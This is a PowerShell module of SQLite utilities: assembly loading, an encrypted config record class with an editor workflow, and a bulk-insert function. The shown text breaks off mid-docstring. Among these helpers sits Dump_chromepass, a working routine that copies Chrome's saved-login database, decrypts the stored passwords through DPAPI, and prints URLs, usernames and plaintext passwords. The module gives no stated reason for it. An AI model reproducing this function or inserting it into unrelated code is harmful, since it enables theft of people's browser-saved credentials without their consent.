function Import-SQLiteDlls {
    # .SYNOPSIS
    #     Imports database assembly and Interop DLLs
    # .DESCRIPTION
    #    Uses API method to load Interop databases and the .NET assembly
    [CmdletBinding()]
    param ()
    begin {
        $code = '
        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string dllToLoad);
        [DllImport("kernel32.dll")]
        public static extern bool FreeLibrary(IntPtr hModule);'
        Add-Type -MemberDefinition $code -Namespace Internal -Name Helper
        Set-Variable parentFolder -Value (Split-Path -Path $PSScriptRoot)
        $UseVerbose = $VerbosePreference -eq "continue"
    }
    process {
        # if ('Internal.Helper' -as 'type' -isnot [type]) {
        #     if (![IO.File]::Exists($Path)) {
        #         Throw [System.DllNotFoundException]::new("Platform SQLite dll not found", [System.IO.FileNotFoundException]::New("Could not find file $Path"))
        #     }
        #     $null = [Internal.Helper]::LoadLibrary($Path)
        #     if ($UseVerbose) { Write-Host "VERBOSE: Loaded Interop assembly" -f Blue }
        # }
        #handle PS2
        if (-not $PSScriptRoot) {
            Set-Variable PSScriptRoot -Option Constant -Value (Split-Path $MyInvocation.MyCommand.Path -Parent)
        }
        #Pick and import assemblies:
        if ($PSEdition -eq 'core') {
            if ($isLinux) {
                Write-Verbose "loading linux-x64 core"
                $SQLiteAssembly = Join-Path $PSScriptRoot "core\linux-x64\System.Data.SQLite.dll"
            }

            if ($isMacOS) {
                Write-Verbose "loading mac-x64 core"
                $SQLiteAssembly = Join-Path $PSScriptRoot "core\osx-x64\System.Data.SQLite.dll"
            }

            if ($isWindows) {
                if ([IntPtr]::size -eq 8) {
                    #64
                    Write-Verbose "loading win-x64 core"
                    $SQLiteAssembly = Join-Path $PSScriptRoot "core\win-x64\System.Data.SQLite.dll"
                } elseif ([IntPtr]::size -eq 4) {
                    #32
                    Write-Verbose "loading win-x32 core"
                    $SQLiteAssembly = Join-Path $PSScriptRoot "core\win-x86\System.Data.SQLite.dll"
                }
            }
            Write-Verbose -Message "is PS Core, loading dotnet core dll"
        } elseif ([IntPtr]::size -eq 8) {
            #64
            Write-Verbose -Message "is x64, loading..."
            $SQLiteAssembly = Join-Path $PSScriptRoot "x64\System.Data.SQLite.dll"
        } elseif ([IntPtr]::size -eq 4) {
            #32
            $SQLiteAssembly = Join-Path $PSScriptRoot "x86\System.Data.SQLite.dll"
        } else {
            Throw "Something is odd with bitness..."
        }

        $Library = Add-Type -Path $SQLiteAssembly -PassThru -ErrorAction stop
        if (!$Library) {
            Throw "This module requires the ADO.NET driver for SQLite:`n`thttp://system.data.sqlite.org/index.html/doc/trunk/www/downloads.wiki"
        }
        if ($UseVerbose) { Write-Host "VERBOSE: SQLite dlls loaded successfully" -f Green }
    }
}

function Initialize-SQLiteDB {
    [CmdletBinding()]
    param ()
    begin {
        $script:Param_TableName_ArgCompleter = [scriptblock]::Create({
                param (
                    $CommandName,
                    $ParameterName,
                    $WordToComplete,
                    $CommandAst,
                    $params
                )
                if ($params.ContainsKey('Database')) {
                    $db = $params['Database'] -as [Database]
                    if ($null -ne $db) {
                        try {
                            $tables = $db.GetTables()
                            $($tables.Keys -like "$WordToComplete*").ForEach({ [System.Management.Automation.CompletionResult]::new($_, $_, [System.Management.Automation.CompletionResultType]::ParameterValue, ("$($tables[$_])".Trim() | Out-String)) })
                        } catch { $null }
                    }
                }
            }
        )
        $script:Param_Database_ArgCompleter = [scriptblock]::Create({
                param (
                    $CommandName,
                    $ParameterName,
                    $WordToComplete,
                    $CommandAst,
                    $params
                )
                Get-Variable | Where-Object { $_.Value -is [Database] } | ForEach-Object {
                    $value = '${0}' -f $_.Name
                    [System.Management.Automation.CompletionResult]::new($value, $value, [System.Management.Automation.CompletionResultType]::Variable, ("$($_.Value)".Trim() | Out-String))
                }
            }
        )
    }
    process {
        if (($VerbosePreference -eq "Continue")) { Write-Host "VERBOSE: Initializing SQLiteDB ..." -f Green }
        Import-SQLiteDlls
        # Register-ArgumentCompleter -ParameterName TableName -CommandName Import-Database -ScriptBlock $Param_TableName_ArgCompleter
        # Register-ArgumentCompleter -ParameterName Database -CommandName Import-Database -ScriptBlock $Param_Database_ArgCompleter
    }
}
function Get-DataPath {
    [CmdletBinding()]
    [OutputType([System.IO.DirectoryInfo])]
    param (
        [Parameter(Mandatory = $true, Position = 0)]
        [ValidateNotNullOrEmpty()]
        [string]$appName,

        [Parameter(Mandatory = $true, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [string]$SubdirName,

        [switch]$DontCreate
    )

    process {
        $_Host_OS = Get-HostOs
        $dataPath = if ($_Host_OS -eq 'Windows') {
            [System.IO.DirectoryInfo]::new([IO.Path]::Combine($Env:HOME, "AppData", "Roaming", $appName, $SubdirName))
        } elseif ($_Host_OS -in ('Linux', 'MacOs')) {
            [System.IO.DirectoryInfo]::new([IO.Path]::Combine((($env:PSModulePath -split [IO.Path]::PathSeparator)[0] | Split-Path | Split-Path), $appName, $SubdirName))
        } elseif ($_Host_OS -eq 'Unknown') {
            try {
                [System.IO.DirectoryInfo]::new([IO.Path]::Combine((($env:PSModulePath -split [IO.Path]::PathSeparator)[0] | Split-Path | Split-Path), $appName, $SubdirName))
            } catch {
                Write-Warning "Could not resolve chat data path"
                Write-Warning "HostOS = '$_Host_OS'. Could not resolve data path."
                [System.IO.Directory]::CreateTempSubdirectory(($SubdirName + 'Data-'))
            }
        } else {
            throw [InvalidOperationException]::new('Could not resolve data path. Get-HostOS FAILED!')
        }
        if (!$dataPath.Exists -and !$DontCreate.IsPresent) { New-Directory -Path $dataPath.FullName }
        return $dataPath
    }
}

function New-RecordMap {
    [CmdletBinding()]
    [OutputType([RecordMap])]
    param (
        [Parameter(Mandatory = $false, Position = 0, ValueFromPipeline = $true)]
        [AllowNull()][Alias('ht')]
        [hashtable[]]$hashtable
    )
    begin {
        class RecordMap {
            hidden [uri] $Remote # usually a gist uri
            hidden [string] $File
            hidden [bool] $IsSynchronized
            [datetime] $LastWriteTime = [datetime]::Now
            RecordMap() { $this._init() }
            RecordMap([hashtable[]]$array) {
                $this.Add($array); $this._init()
            }
            hidden [void] _init() {
                $this | Add-Member -MemberType ScriptProperty -Name 'Properties' -Value {
                    return ($this | Get-Member -Type *Property).Name.Where({ $_ -notin ('Count', 'Properties', 'IsSynchronized') })
                } -SecondValue {
                    Throw [System.InvalidOperationException]::new("'Properties' is a readOnly property!")
                } -Force
                $this.PsObject.properties.add([psscriptproperty]::new('Count', [scriptblock]::Create({ $this.Properties.count })))
            }
            [void] Import([uri]$raw_uri, [Object]$session) {
                try {
                    Push-Stack -class "ArgonCage"; $pass = $null;
                    Set-Variable -Name pass -Scope Local -Visibility Private -Option Private -Value $([RecordMap]::GetSessionKey("Paste/write a Password to decrypt configs", $session, 'configrw'))
                    $_ob = (xconvert)::Deserialize((xconvert)::ToDeCompressed((AesGCM)::Decrypt((Base85)::Decode($(Invoke-WebRequest $raw_uri -Verbose:$false).Content), $pass)))
                    $this.Set([hashtable[]]$_ob.Properties.Name.ForEach({ @{ $_ = $_ob.$_ } }))
                } catch {
                    throw $_
                } finally {
                    Remove-Variable Pass -Force -ErrorAction SilentlyContinue
                }
            }
            [void] Import([String]$FilePath, [PsObject]$session) {
                Write-Host "$(Show-Stack) Import records: $FilePath ..." -f Green
                $this.Set([RecordMap]::Read($FilePath, $session))
                Write-Host "$(Show-Stack) Import records Complete" -f Green
            }
            [void] Upload() {
                if ([string]::IsNullOrWhiteSpace($this.Remote)) { throw [System.ArgumentException]::new('remote') }
                # $gisturi = 'https://gist.github.com/' + $this.Remote.Segments[2] + $this.Remote.Segments[2].replace('/', '')
                # Update-Gist -uri $gisturi -c $content
            }
            [void] Add([hashtable]$table) {
                [ValidateNotNullOrEmpty()][hashtable]$table = $table
                $Keys = $table.Keys | Where-Object { !$this.HasNoteProperty($_) -and ($_.GetType().FullName -eq 'System.String' -or $_.GetType().BaseType.FullName -eq 'System.ValueType') }
                foreach ($key in $Keys) {
                    if ($key -notin ('File', 'Remote', 'LastWriteTime')) {
                        $this | Add-Member -MemberType NoteProperty -Name $key -Value $table[$key]
                    } else {
                        $this.$key = $table[$key]
                    }
                }
            }
            [void] Add([hashtable[]]$items) {
                foreach ($item in $items) { $this.Add($item) }
            }
            [void] Add([string]$key, [System.Object]$value) {
                [ValidateNotNullOrEmpty()][string]$key = $key
                if (!$this.HasNoteProperty($key)) {
                    $htab = [hashtable]::new(); $htab.Add($key, $value); $this.Add($htab)
                } else {
                    Write-Warning "Record.Add() Skipped $Key. Key already exists."
                }
            }
            [void] Add([System.Collections.Generic.List[hashtable]]$items) {
                foreach ($item in $items) { $this.Add($item) }
            }
            [void] Set([string]$key, [System.Object]$value) {
                $htab = [hashtable]::new(); $htab.Add($key, $value)
                $this.Set($htab)
            }
            [void] Set([hashtable[]]$items) {
                foreach ($item in $items) { $this.Set($item) }
            }
            [void] Set([hashtable]$table) {
                [ValidateNotNullOrEmpty()][hashtable]$table = $table
                $Keys = $table.Keys | Where-Object { $_.GetType().FullName -eq 'System.String' -or $_.GetType().BaseType.FullName -eq 'System.ValueType' } | Sort-Object -Unique
                foreach ($key in $Keys) {
                    if (!$this.PsObject.Properties.Name.Contains($key)) {
                        $this | Add-Member -MemberType NoteProperty -Name $key -Value $table[$key] -Force
                    } else {
                        $this.$key = $table[$key]
                    }
                }
            }
            [void] Set([System.Collections.Specialized.OrderedDictionary]$dict) {
                $dict.Keys.Foreach({ $this.Set($_, $dict["$_"]) });
            }
            [bool] HasNoteProperty([object]$Name) {
                [ValidateNotNullOrEmpty()][string]$Name = $($Name -as 'string')
                return (($this | Get-Member -Type NoteProperty | Select-Object -ExpandProperty name) -contains "$Name")
            }
            static hidden [SecureString] GetSessionKey([string]$message, [PsObject]$session, [string]$Name) {
                return $session.GetSessionKey($Name, [PSCustomObject]@{
                        caller = Show-Stack
                        prompt = $message
                    }
                )
            }
            [array] ToArray() {
                $array = @(); $props = $this | Get-Member -MemberType NoteProperty
                if ($null -eq $props) { return @() }
                $props.name | ForEach-Object { $array += @{ $_ = $this.$_ } }
                return $array
            }
            [string] ToJson() {
                return [string]($this | Select-Object -ExcludeProperty count | ConvertTo-Json -Depth 3)
            }
            [System.Collections.Specialized.OrderedDictionary] ToOrdered() {
                $dict = [System.Collections.Specialized.OrderedDictionary]::new(); $Keys = $this.PsObject.Properties.Where({ $_.Membertype -like "*Property" }).Name
                if ($Keys.Count -gt 0) {
                    $Keys | ForEach-Object { [void]$dict.Add($_, $this."$_") }
                }
                return $dict
            }
            static [hashtable[]] Read([string]$FilePath, $session) {
                Push-Stack -class "ArgonCage"; $pass = $null; $cfg = $null; $FilePath = (AesGCM)::GetResolvedPath($FilePath);
                if ([IO.File]::Exists($FilePath)) { if ([string]::IsNullOrWhiteSpace([IO.File]::ReadAllText($FilePath).Trim())) { throw [System.Exception]::new("File is empty: $FilePath") } } else { throw [System.IO.FileNotFoundException]::new("File not found: $FilePath") }
                Set-Variable -Name pass -Scope Local -Visibility Private -Option Private -Value $([RecordMap]::GetSessionKey("Paste/write a Password to decrypt configs", $session, 'configrw'))
                $txt = [IO.File]::ReadAllText($FilePath)
                $_ob = (xconvert)::Deserialize((xconvert)::ToDeCompressed((AesGCM)::Decrypt((Base85)::Decode($txt), $pass)))
                $cfg = [hashtable[]]$_ob.PsObject.Properties.Name.Where({ $_ -notin ('Count', 'Properties', 'IsSynchronized') }).ForEach({ @{ $_ = $_ob.$_ } })
                return $cfg
            }
            [hashtable[]] Edit($session) {
                $result = $this.Edit($this.File, $session)
                $this.Set($result); $this.Save($session)
                return $result
            }
            [hashtable[]] Edit([string]$FilePath, [Object]$session) {
                $result = @(); $private:config_ob = $null; $fswatcher = $null; $process = $null;
                $FilePath = (AesGCM)::GetResolvedPath($FilePath);
                if ([IO.File]::Exists($FilePath)) { if ([string]::IsNullOrWhiteSpace([IO.File]::ReadAllText($FilePath).Trim())) { throw [System.Exception]::new("File is empty: $FilePath") } } else { throw [System.IO.FileNotFoundException]::new("File not found: $FilePath") }
                $OutFile = [IO.FileInfo][IO.Path]::GetTempFileName()
                $UseVerbose = [bool]$((Get-Variable verbosePreference -ValueOnly) -eq "continue")
                try {
                    Block-AllOutboundConnections
                    if ($UseVerbose) { "[+] Edit Config started .." | Write-Host -f Magenta }
                    $parsed_content = [RecordMap]::Read($FilePath, $session);
                    [ValidateNotNullOrEmpty()][hashtable[]]$parsed_content = $parsed_content
                    $parsed_content | ConvertTo-Json | Out-File $OutFile.FullName -Encoding utf8BOM
                    Set-Variable -Name OutFile -Value $(Rename-Item $outFile.FullName -NewName ($outFile.BaseName + '.json') -PassThru)
                    $process = [System.Diagnostics.Process]::new()
                    $process.StartInfo.FileName = 'nvim'
                    $process.StartInfo.Arguments = $outFile.FullName
                    $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Maximized
                    $process.Start(); $fswatcher = Start-FsWatcher -File $outFile.FullName -OnComplete ([scriptblock]::Create("Stop-Process -Id $($process.Id) -Force"));
                    if ($null -eq $fswatcher) { Write-Warning "Failed to start FileMonitor"; Write-Host "Waiting nvim process to exit..." $process.WaitForExit() }
                    $private:config_ob = [IO.FILE]::ReadAllText($outFile.FullName) | ConvertFrom-Json
                } finally {
                    Unblock-AllOutboundConnections
                    if ($fswatcher) { $fswatcher.Dispose() }
                    if ($process) {
                        "[+] Neovim process {0} successfully" -f $(if (!$process.HasExited) {
                                $process.Kill($true)
                                "closed"
                            } else {
                                "exited"
                            }
                        ) | Write-Host -f Green
                        $process.Close()
                        $process.Dispose()
                    }
                    Remove-Item $outFile.FullName -Force
                    Set-Variable -Name (Get-FMLogvariableName) -Scope Global -Value (Get-FileMonitorLog) | Out-Null
                    if ($UseVerbose) { "[+] FileMonitor Log saved in variable: `$$(Get-FMLogvariableName)" | Write-Host -f Magenta }
                    if ($null -ne $config_ob) { $result = $config_ob.ForEach({ (xconvert)::ToHashTable($_) }) }
                    if ($UseVerbose) { "[+] Edit Config completed." | Write-Host -f Magenta }
                }
                return $result
            }
            [void] Save($session) {
                try {
                    [ValidateNotNullOrEmpty()][Object]$session = $session
                    $cllr = Show-Stack; [ValidateNotNullOrEmpty()][string]$cllr = $cllr
                    $pass = $null; Write-Host "$cllr Saving records to file: $($this.File) ..." -f Blue
                    Set-Variable -Name pass -Scope Local -Visibility Private -Option Private -Value $($session.GetSessionKey('configrw', [PSCustomObject]@{
                                caller = $cllr
                                prompt = "Paste/write a Password to encrypt configs"
                            }
                        )
                    ); [ValidateNotNullOrEmpty()][securestring]$pass = $pass
                    $this.LastWriteTime = [datetime]::Now; [IO.File]::WriteAllText($this.File, (Base85)::Encode((AesGCM)::Encrypt((xconvert)::ToCompressed($this.ToByte()), $pass)), [System.Text.Encoding]::UTF8)
                    Write-Host "$cllr Saving records " -f Blue -NoNewline; Write-Host "Completed." -f Green
                } catch {
                    throw $_
                } finally {
                    Remove-Variable Pass -Force -ErrorAction SilentlyContinue
                }
            }
            [byte[]] ToByte() {
                return (xconvert)::Serialize($this)
            }
            [string] ToString() {
                $r = $this.ToArray(); $s = ''
                $shortnr = [scriptblock]::Create({
                        param([string]$str, [int]$MaxLength)
                        while ($str.Length -gt $MaxLength) {
                            $str = $str.Substring(0, [Math]::Floor(($str.Length * 4 / 5)))
                        }
                        return $str
                    }
                )
                if ($r.Count -gt 1) {
                    $b = $r[0]; $e = $r[-1]
                    $0 = $shortnr.Invoke("{'$($b.Keys)' = '$($b.values.ToString())'}", 40)
                    $1 = $shortnr.Invoke("{'$($e.Keys)' = '$($e.values.ToString())'}", 40)
                    $s = "@($0 ... $1)"
                } elseif ($r.count -eq 1) {
                    $0 = $shortnr.Invoke("{'$($r[0].Keys)' = '$($r[0].values.ToString())'}", 40)
                    $s = "@($0)"
                } else {
                    $s = '@()'
                }
                return $s
            }
        }
    }
    end {
        if ($PSCmdlet.MyInvocation.BoundParameters.ContainsKey('hashtable')) {
            if ($null -ne $hashtable) {
                return [RecordMap]::New($hashtable)
            }
        }
        return [RecordMap]::New()
    }
}
function Get-HostOs() {
    process {
        #TODO: refactor so that it returns one of these: [Enum]::GetNames([System.PlatformID])
        return $(
            if ($(Get-Variable IsWindows -Value)) {
                "Windows"
            } elseif ($(Get-Variable IsLinux -Value)) {
                "Linux"
            } elseif ($(Get-Variable IsMacOS -Value)) {
                "macOS"
            } else {
                "UNKNOWN"
            }
        )
    }
}
function New-Directory {
    [CmdletBinding()]
    [OutputType([void])]
    param (
        [Parameter(Mandatory = $true, Position = 0)]
        [string]$Path
    )
    process {
        [ValidateNotNullOrEmpty()][System.IO.DirectoryInfo]$Path = $Path
        $nF = @(); $p = $Path; while (!$p.Exists) { $nF += $p; $p = $p.Parent }
        [Array]::Reverse($nF); $nF | ForEach-Object { $_.Create(); Write-Debug "Created $_" }
    }
}

function Dump_chromepass {
    [CmdletBinding()]
    param ()
    process {
        Add-Type -AssemblyName System.Security
        # default path to Chrome user passwords database:
        $Path = [IO.Path]::Combine("$env:LOCALAPPDATA", "Google", "Chrome", "User Data", "Default", "Login Data")
        if (![IO.File]::Exists($Path)) {
            Write-Warning "No Chrome Database found."
            return
        }
        # copy the database (the original file is locked while Chrome is running):
        $Destination = [IO.Path]::Combine($env:temp, "chrome_data.db")
        Copy-Item -Path $Path -Destination $Destination
        # query to retrieve the cached passwords:
        $sql = "SELECT action_url, username_value, password_value FROM logins"
        # rename column headers:
        $url = @{N = 'Url'; E = { $_.action_url } }
        $username = @{N = 'Username'; E = { $_.username_value } }
        $password = @{N = 'Password'; E = { [System.Text.Encoding]::Default.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($_.password_value, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)) } }
        $db = New-Database -Path $Destination
        $db.InvokeSql($sql) | Select-Object $url, $username, $password
    }
}

function Invoke-SQLiteBulkCopy {
    <#
    .SYNOPSIS
        Use a SQLite transaction to quickly insert data

    .DESCRIPTION
        Use a SQLite transaction to quickly insert data.  If we run into any errors, we roll back the transaction.

        The data source is not limited to SQL Server; any data source can be used, as long as the data can be loaded to a DataTable instance or read with a IDataReader instance.

    .PARAMETER DataSource
        Path to one ore more SQLite data sources to query

    .PARAMETER Force
        If specified, skip the confirm prompt

    .PARAMETER  NotifyAfter
        The number of rows to fire the notification event after transferring.  0 means don't notify.  Notifications hit the verbose stream (use -verbose to see them)

    .PARAMETER QueryTimeout
        Specifies the number of seconds before the queries time out.

    .PARAMETER SQLiteConnection
        An existing SQLiteConnection to use.  We do not close this connection upon completed query.

    .PARAMETER ConflictClause
        The conflict clause to use in case a conflict occurs during insert. Valid values: Rollback, Abort, Fail, Ignore, Replace

        See https://www.sqlite.org/lang_conflict.html for more details

    .EXAMPLE
        #
        #Create a table
            Invoke-SqliteQuery -DataSource "C:\Names.SQLite" -Query "CREATE TABLE NAMES (
                fullname VARCHAR(20) PRIMARY KEY,
                surname TEXT,
                givenname TEXT,
                BirthDate DATETIME)"

        #Build up some fake data to bulk insert, convert it to a datatable
            $DataTable = 1..10000 | %{
                [pscustomobject]@{
                    fullname = "Name $_"
                    surname = "Name"
                    givenname = "$_"
                    BirthDate = (Get-Date).Adddays(-$_)
                }
            } | Out-DataTable

        #Copy the data in within a single transaction (SQLite is faster this way)
            Invoke-SQLiteBulkCopy -DataTable $DataTable -DataSource $Database -Table Names -NotifyAfter 1000 -ConflictClause Ignore -Verbose

    .INPUTS
        System.Data.DataTable

    .OUTPUTS
        None
            Produces no output
    .LINK
        https://github.com/RamblingCookieMonster/Invoke-SQLiteQuery

    .LINK
        New-SQLiteConnection

    .LINK
        Invoke-SQLiteBulkCopy

    .LINK
        Out-DataTable

    .FUNCTIONALITY
        SQL
    #>
    [cmdletBinding( DefaultParameterSetName = 'Datasource',
        SupportsShouldProcess = $true,
        ConfirmImpact = 'High' )]
    param(
        [parameter( Position = 0,
            Mandatory = $true,
            ValueFromPipeline = $false,
            ValueFromPipelineByPropertyName = $false)]
        [System.Data.DataTable]
        $DataTable,

        [Parameter( ParameterSetName = 'Datasource',
            Position = 1,
            Mandatory = $true,
            ValueFromRemainingArguments = $false,
            HelpMessage = 'SQLite Data Source required...' )]
        [Alias('Path', 'File', 'FullName', 'Database')]
        [validatescript({
                #This should match memory, or the parent path should exist
                if ( $_ -match ":MEMORY:" -or (Test-Path $_) ) {
                    $True
                } else {
                    Throw "Invalid datasource '$_'.`nThis must match :MEMORY:, or must exist"
                }
            })]
        [string]
        $DataSource,

        [Parameter( ParameterSetName = 'Connection',
            Position = 1,
            Mandatory = $true,
            ValueFromPipeline = $false,
            ValueFromPipelineByPropertyName = $true,
            ValueFromRemainingArguments = $false )]
        [Alias( 'Connection', 'Conn' )]
        [System.Data.SQLite.SQLiteConnection]
        $SQLiteConnection,

        [parameter( Position = 2,
            Mandatory = $true)]
        [string]
        $Table,

        [Parameter( Position = 3,
            Mandatory = $false,
            ValueFromPipeline = $false,
            ValueFromPipelineByPropertyName = $false,
            ValueFromRemainingArguments = $false)]
        [ValidateSet("Rollback", "Abort", "Fail", "Ignore", "Replace")]
        [string]
        $ConflictClause,

        [int]
        $NotifyAfter = 0,

        [switch]
        $Force,

        [Int32]
        $QueryTimeout = 600

    )

    Write-Verbose "Running Invoke-SQLiteBulkCopy with ParameterSet '$($PSCmdlet.ParameterSetName)'."

    Function CleanUp {
        [cmdletbinding()]
        param($conn, $com, $BoundParams)
        #Only dispose of the connection if we created it
        if ($BoundParams.Keys -notcontains 'SQLiteConnection') {
            $conn.Close()
            $conn.Dispose()
            Write-Verbose "Closed connection"
        }
        $com.Dispose()
    }

    function Get-ParameterName {
        [CmdletBinding()]
        Param(
            [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
            [string[]]$InputObject,

            [Parameter(ValueFromPipelineByPropertyName = $true)]
            [string]$Regex = '(\W+)',

            [Parameter(ValueFromPipelineByPropertyName = $true)]
            [string]$Separator = '_'
        )

        Process {
            $InputObject | ForEach-Object {
                if ($_ -match $Regex) {
                    $Groups = @($_ -split $Regex | Where-Object { $_ })
                    for ($i = 0; $i -lt $Groups.Count; $i++) {
                        if ($Groups[$i] -match $Regex) {
                            $Groups[$i] = ($Groups[$i].ToCharArray() | ForEach-Object { [string][int]$_ }) -join $Separator
                        }
                    }
                    $Groups -join $Separator
                } else {
                    $_
                }
            }
        }
    }

    function New-SqliteBulkQuery {
        [CmdletBinding()]
        Param(
            [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true)]
            [string]$Table,

            [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true)]
            [string[]]$Columns,

            [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true)]
            [string[]]$Parameters,

            [Parameter(ValueFromPipelineByPropertyName = $true)]
            [string]$ConflictClause = ''
        )

        Begin {
            $EscapeSingleQuote = "'", "''"
            $Delimeter = ", "
            $QueryTemplate = "INSERT{0} INTO {1} ({2}) VALUES ({3})"
        }

        Process {
            $fmtConflictClause = if ($ConflictClause) { " OR $ConflictClause" }
            $fmtTable = "'{0}'" -f ($Table -replace $EscapeSingleQuote)
            $fmtColumns = ($Columns | ForEach-Object { "'{0}'" -f ($_ -replace $EscapeSingleQuote) }) -join $Delimeter
            $fmtParameters = ($Parameters | ForEach-Object { "@$_" }) -join $Delimeter

            $QueryTemplate -f $fmtConflictClause, $fmtTable, $fmtColumns, $fmtParameters
        }
    }

    #Connections
    if ($PSBoundParameters.Keys -notcontains "SQLiteConnection") {
        if ($DataSource -match ':MEMORY:') {
            $Database = $DataSource
        } else {
            $Database = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($DataSource)
        }

        $ConnectionString = "Data Source={0}" -f $Database
        $SQLiteConnection = New-Object System.Data.SQLite.SQLiteConnection -ArgumentList $ConnectionString
        $SQLiteConnection.ParseViaFramework = $true #Allow UNC paths, thanks to Ray Alex!
    }

    Write-Debug "ConnectionString $($SQLiteConnection.ConnectionString)"
    Try {
        if ($SQLiteConnection.State -notlike "Open") {
            $SQLiteConnection.Open()
        }
        $Command = $SQLiteConnection.CreateCommand()
        Set-Variable CommandTimeout -Scope Local -Value $QueryTimeout
        $Transaction = $SQLiteConnection.BeginTransaction()
    } Catch {
        Throw $_
    }

    Write-Verbose "DATATABLE IS $($DataTable.gettype().fullname) with value $($Datatable | Out-String)"
    $RowCount = $Datatable.Rows.Count
    Write-Verbose "Processing datatable with $RowCount rows"

    if ($Force -or $PSCmdlet.ShouldProcess("$($DataTable.Rows.Count) rows, with BoundParameters $($PSBoundParameters | Out-String)", "SQL Bulk Copy")) {
        #Get column info...
        [array]$Columns = $DataTable.Columns | Select-Object -ExpandProperty ColumnName
        $ColumnTypeHash = @{}
        $ColumnToParamHash = @{}
        $Index = 0
        foreach ($Col in $DataTable.Columns) {
            $Type = Switch -regex ($Col.DataType.FullName) {
                # I figure we create a hashtable, can act upon expected data when doing insert
                # Might be a better way to handle this...
                '^(|\ASystem\.)Boolean$' { "BOOLEAN" } #I know they're fake...
                '^(|\ASystem\.)Byte\[\]' { "BLOB" }
                '^(|\ASystem\.)Byte$' { "BLOB" }
                '^(|\ASystem\.)Datetime$' { "DATETIME" }
                '^(|\ASystem\.)Decimal$' { "REAL" }
                '^(|\ASystem\.)Double$' { "REAL" }
                '^(|\ASystem\.)Guid$' { "TEXT" }
                '^(|\ASystem\.)Int16$' { "INTEGER" }
                '^(|\ASystem\.)Int32$' { "INTEGER" }
                '^(|\ASystem\.)Int64$' { "INTEGER" }
                '^(|\ASystem\.)UInt16$' { "INTEGER" }
                '^(|\ASystem\.)UInt32$' { "INTEGER" }
                '^(|\ASystem\.)UInt64$' { "INTEGER" }
                '^(|\ASystem\.)Single$' { "REAL" }
                '^(|\ASystem\.)String$' { "TEXT" }
                Default { "BLOB" } #Let SQLite handle the rest...
            }

            #We ref columns by their index, so add that...
            $ColumnTypeHash.Add($Index, $Type)

            # Parameter names can only be alphanumeric: https://www.sqlite.org/c3ref/bind_blob.html
            # So we have to replace all non-alphanumeric chars in column name to use it as parameter later.
            # This builds hashtable to correlate column name with parameter name.
            $ColumnToParamHash.Add($Col.ColumnName, (Get-ParameterName $Col.ColumnName))

            $Index++
        }

        #Build up the query
        if ($PSBoundParameters.ContainsKey('ConflictClause')) {
            $Command.CommandText = New-SqliteBulkQuery -Table $Table -Columns $ColumnToParamHash.Keys -Parameters $ColumnToParamHash.Values -ConflictClause $ConflictClause
        } else {
            $Command.CommandText = New-SqliteBulkQuery -Table $Table -Columns $ColumnToParamHash.Keys -Parameters $ColumnToParamHash.Values
        }

        foreach ($Column in $Columns) {
            $param = New-Object System.Data.SQLite.SqLiteParameter $ColumnToParamHash[$Column]
            [void]$Command.Parameters.Add($param)
        }

        for ($RowNumber = 0; $RowNumber -lt $RowCount; $RowNumber++) {
            $row = $Datatable.Rows[$RowNumber]
            for ($col = 0; $col -lt $Columns.count; $col++) {
                # Depending on the type of thid column, quote it
                # For dates, convert it to a string SQLite will recognize
                switch ($ColumnTypeHash[$col]) {
                    "BOOLEAN" {
                        $Command.Parameters[$ColumnToParamHash[$Columns[$col]]].Value = [int][boolean]$row[$col]
                    }
                    "DATETIME" {
                        Try {
                            $Command.Parameters[$ColumnToParamHash[$Columns[$col]]].Value = $row[$col].ToString("yyyy-MM-dd HH:mm:ss")
                        } Catch {
                            $Command.Parameters[$ColumnToParamHash[$Columns[$col]]].Value = $row[$col]
                        }
                    }
                    Default {
                        $Command.Parameters[$ColumnToParamHash[$Columns[$col]]].Value = $row[$col]
                    }
                }
            }

            #We have the query, execute!
            Try {
                [void]$Command.ExecuteNonQuery()
            } Catch {
                #Minimal testing for this rollback...
                Write-Verbose "Rolling back due to error:`n$_"
                $Transaction.Rollback()

                #Clean up and throw an error
                CleanUp -conn $SQLiteConnection -com $Command -BoundParams $PSBoundParameters
                Throw "Rolled back due to error:`n$_"
            }

            if ($NotifyAfter -gt 0 -and $($RowNumber % $NotifyAfter) -eq 0) {
                Write-Verbose "Processed $($RowNumber + 1) records"
            }
        }
    }

    #Commit the transaction and clean up the connection
    $Transaction.Commit()
    CleanUp -conn $SQLiteConnection -com $Command -BoundParams $PSBoundParameters

}

function Invoke-SqliteQuery {
    <#
    .SYNOPSIS
        Runs a SQL script against a SQLite database.

    .DESCRIPTION
        Runs a SQL script against a SQLite database.

        Paramaterized queries are supported.

        Help details below borrowed from Invoke-Sqlcmd, may be inaccurate here.

    .PARAMETER DataSource
        Path to one or more SQLite data sources to query

    .PARAMETER Query
        Specifies a query to be run.

    .PARAMETER InputFile
        Specifies a file to be used as the query input to Invoke-SqliteQuery. Specify the full path to the file.

    .PARAMETER QueryTimeout
        Specifies the number of seconds before the queries time out.

    .PARAMETER As
        Specifies output type - DataSet, DataTable, array of DataRow, PSObject or Single Value

        PSObject output introduces overhead but adds flexibility for working with results: http://powershell.org/wp/forums/topic/dealing-with-dbnull/

    .PARAMETER SqlParameters
        Hashtable of parameters for parameterized SQL queries.  http://blog.codinghorror.com/give-me-parameterized-sql-or-give-me-death/

        Limited support for conversions to SQLite friendly formats is supported.
            For example, if you pass in a .NET DateTime, we convert it to a string that SQLite will recognize as a datetime

        Example:
            -Query "SELECT ServerName FROM tblServerInfo WHERE ServerName LIKE @ServerName"
            -SqlParameters @{"ServerName = "c-is-hyperv-1"}

    .PARAMETER SQLiteConnection
        An existing SQLiteConnection to use.  We do not close this connection upon completed query.

    .PARAMETER AppendDataSource
        If specified, append the SQLite data source path to PSObject or DataRow output

    .INPUTS
        DataSource
            You can pipe DataSource paths to Invoke-SQLiteQuery.  The query will execute against each Data Source.

    .OUTPUTS
        As PSObject:     System.Management.Automation.PSCustomObject
        As DataRow:      System.Data.DataRow
        As DataTable:    System.Data.DataTable
